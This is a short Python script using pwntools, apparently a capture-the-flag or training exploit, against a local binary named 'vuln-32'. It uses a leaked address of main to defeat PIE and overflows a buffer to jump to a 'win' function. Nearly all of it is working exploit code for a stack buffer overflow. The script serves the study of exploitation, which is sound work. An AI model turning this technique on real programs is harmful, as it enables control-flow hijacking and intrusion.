from pwn import *

# Set arch context
elf = context.binary = ELF('./vuln-32')

# Initialize process
io = process()

# Start reading at the address given
io.recvuntil('at: ')
main_leak = int(io.recvline(), 16)

# Subtracting real main address from main offset address to get base address
elf.address = main_leak - elf.sym['main'] #(main_offset)

payload = b'A' * 32
payload += p32(elf.sym['win'])

io.sendline(payload)

print(io.clean().decode('latin-1'))


# main_offset is contant and was determined at compile time
# main_leak is the actual memory address of main function at runtime (address keeps changing bcs of PIE)

